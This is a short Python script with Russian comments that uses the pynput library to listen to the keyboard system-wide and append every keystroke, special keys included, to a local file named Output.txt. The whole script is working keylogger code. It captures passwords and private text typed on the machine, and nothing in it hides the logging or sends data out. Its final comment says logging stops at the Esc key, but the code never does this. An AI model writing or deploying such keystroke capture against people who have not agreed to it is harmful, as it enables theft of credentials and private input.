from pynput import keyboard
import threading

# Глобальная переменная для хранения нажатых клавиш
lock = threading.Lock()  # Для потокобезопасного доступа к файлу

def on_press(key):
    try:
        # Записываем нажатую клавишу в файл сразу
        with lock:
            with open("Output.txt", "a") as text_file:  # Открываем файл в режиме добавления
                text_file.write(key.char)  # Записываем символ в файл
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))
        with lock:
            with open("Output.txt", "a") as text_file:  # Открываем файл в режиме добавления
                if key == keyboard.Key.space:
                    text_file.write(' ')  # Записываем пробел для специальной клавиши Space
                else:
                    text_file.write('[' + str(key) + ']')  # Записываем специальную клавишу в файл

# Собираем события до тех пор, пока не будет нажата клавиша Esc
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()